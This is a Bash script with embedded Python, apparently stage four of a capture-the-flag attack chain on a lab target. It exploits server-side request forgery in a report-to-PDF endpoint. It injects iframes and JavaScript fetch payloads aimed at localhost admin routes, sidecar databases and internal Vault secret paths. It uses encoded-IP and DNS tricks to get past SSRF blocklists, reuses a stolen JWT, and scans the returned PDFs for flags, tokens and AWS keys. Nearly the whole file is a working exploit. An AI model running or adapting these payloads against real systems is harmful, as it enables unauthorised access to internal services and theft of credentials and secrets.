#!/usr/bin/env bash
# Stage 4 — barrido de targets INTERNOS (no AWS) en busca del flag real
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT=$(cat "${LOOT_DIR}/stage2_access_token.jwt")
OUTDIR="${LOOT_DIR}/pdfs_internal"
mkdir -p "${OUTDIR}"

post_template() {
  local label="$1" template="$2"
  local payload
  payload=$(jq -n --arg t "${template}" '{template:$t}')
  curl -s -X POST "${API_URL}/api/v2/reports/generate" \
    -H "Authorization: Bearer ${JWT}" \
    -H "Content-Type: application/json" \
    -d "${payload}" -o "${OUTDIR}/${label}.json"
  size=$(jq -r '.pdf_size_bytes // 0' "${OUTDIR}/${label}.json" 2>/dev/null || echo 0)
  echo "[+] ${label} pdf_size=${size}"
}

# ============================================================
# Templates apuntando a posibles endpoints INTERNOS del server
# ============================================================

TARGETS=(
  # API local
  "http://localhost:8090/"
  "http://localhost:8090/admin"
  "http://localhost:8090/api/v2/admin"
  "http://localhost:8090/api/v2/admin/dashboard"
  "http://localhost:8090/api/v2/admin/secrets"
  "http://localhost:8090/api/v2/admin/users"
  "http://localhost:8090/api/v2/admin/flag"
  "http://localhost:8090/api/v2/admin/audit"
  "http://localhost:8090/api/v2/internal"
  "http://localhost:8090/api/v2/internal/flag"
  "http://localhost:8090/api/v2/internal/secrets"
  "http://localhost:8090/api/v2/internal/users"
  "http://localhost:8090/api/internal"
  "http://localhost:8090/internal"
  "http://localhost:8090/flag"
  "http://localhost:8090/secret"
  "http://localhost:8090/health"
  "http://localhost:8090/metrics"
  "http://localhost:8090/debug"
  "http://localhost:8090/api/graphql"
  # 127.0.0.1 (a veces los SSRF blocklists no cubren ambos)
  "http://127.0.0.1:8090/api/v2/admin"
  "http://127.0.0.1:8090/internal"
  "http://127.0.0.1:8090/flag"
  # Otros puertos comunes en el mismo host (sidecars)
  "http://localhost:3000/"
  "http://localhost:4000/"
  "http://localhost:5000/"
  "http://localhost:6000/"
  "http://localhost:7000/"
  "http://localhost:9000/"
  "http://localhost:9090/"
  "http://localhost:9200/"  # Elasticsearch
  "http://localhost:6379/"  # Redis
  "http://localhost:11211/" # Memcached
  "http://localhost:5984/"  # CouchDB
  "http://localhost:27017/" # Mongo
  # Vault paths (el más probable según _hint del Stage 5)
  "http://internal-vault.nexacorp.local:8200/v1/secret/data/critical"
  "http://internal-vault.nexacorp.local:8200/v1/secret/metadata"
  "http://internal-vault.nexacorp.local:8200/v1/sys/internal/ui/mounts"
  "http://internal-vault.nexacorp.local:8200/v1/auth/token/lookup-self"
  "http://internal-vault.nexacorp.local:8200/v1/sys/policy"
  # IPs decimal/hex bypass
  "http://2130706433:8090/api/v2/admin"
  "http://0x7f000001:8090/api/v2/admin"
  "http://0177.0.0.01:8090/api/v2/admin"
  # Same host, mismo puerto via FQDN (auto-fetch)
  "http://nexacorp.ine.local:8090/api/v2/admin"
  "http://nexacorp.ine.local:8090/internal"
  "http://nexacorp.ine.local:8090/flag"
  # DNS rebinding/host tricks
  "http://localhost.nexacorp.local:8090/admin"
  "http://[::1]:8090/admin"
  "http://0:8090/admin"
)

i=0
for t in "${TARGETS[@]}"; do
  label=$(printf "%03d_%s" "$i" "$(echo "$t" | tr '/:.' '_' | head -c 80)")
  template="<html><body><iframe src='${t}' width='1200' height='2000' style='border:none'></iframe></body></html>"
  post_template "${label}" "${template}"
  i=$((i+1))
done

# Templates JS fetch para esperar networkidle
for t in \
  "http://localhost:8090/api/v2/admin" \
  "http://internal-vault.nexacorp.local:8200/v1/secret/data/critical" \
  "http://localhost:8090/internal" \
  "http://localhost:8090/flag"; do
  label="js_$(echo "$t" | tr '/:.' '_' | head -c 60)"
  template="<html><body><pre id='r' style='font-size:14px;white-space:pre-wrap'>loading</pre><script>fetch('${t}',{credentials:'include'}).then(r=>r.text()).then(t=>{document.getElementById('r').textContent=t;}).catch(e=>{document.getElementById('r').textContent='ERR:'+e.message;});</script></body></html>"
  post_template "${label}" "${template}"
done

echo
echo "[*] Buscando PDFs con tamaño no-trivial (>2KB significa que el iframe cargó algo)..."
ls -laS "${OUTDIR}"/ | head -20

echo
echo "[*] Decodificando todos los PDFs y buscando flags..."

python3 <<'PYEOF'
import os, re, zlib, base64, json

OUTDIR = os.path.expanduser("~/nexacorp-loot/pdfs_internal")

def decode_shift(s):
    return ''.join(chr(ord(c)+29) if 33 <= ord(c) <= 95 and ord(c)+29 <= 126 else c for c in s)

def extract_pdf_text(pdf_bytes):
    streams = re.findall(rb'stream\r?\n(.*?)\r?\nendstream', pdf_bytes, re.DOTALL)
    chunks = []
    for s in streams:
        try:
            d = zlib.decompress(s.strip(b'\r\n '))
        except Exception:
            continue
        for m in re.findall(rb'\(((?:\\.|[^\\()])*)\)', d, re.DOTALL):
            try:
                t = m.decode('latin-1', errors='replace')
                t = t.replace('\\(', '(').replace('\\)', ')').replace('\\\\', '\\')
                chunks.append(t)
            except Exception:
                pass
    return ' '.join(chunks)

flags = set()
for fname in sorted(os.listdir(OUTDIR)):
    if not fname.endswith('.json'):
        continue
    try:
        d = json.load(open(os.path.join(OUTDIR, fname)))
        b64 = d.get('pdf_base64', '')
        if not b64:
            continue
        pdf = base64.b64decode(b64)
        cipher = extract_pdf_text(pdf)
        plain = decode_shift(cipher)
        # Buscar flag patterns
        for m in re.findall(r'FLAG\{[^}]+\}', plain):
            if m not in flags:
                flags.add(m)
                print(f"[FLAG] {fname} → {m}")
        # Buscar también texto interesante: AccessKey, secrets, admin words
        if any(k in plain.lower() for k in ['flag', 'admin', 'secret', 'token', 'access_key', 'aws']):
            print(f"[INTERESTING] {fname}: {plain[:300]}")
    except Exception as e:
        pass

print()
print(f"[+] Total flags únicas: {len(flags)}")
for f in sorted(flags):
    print(f"    {f}")
PYEOF
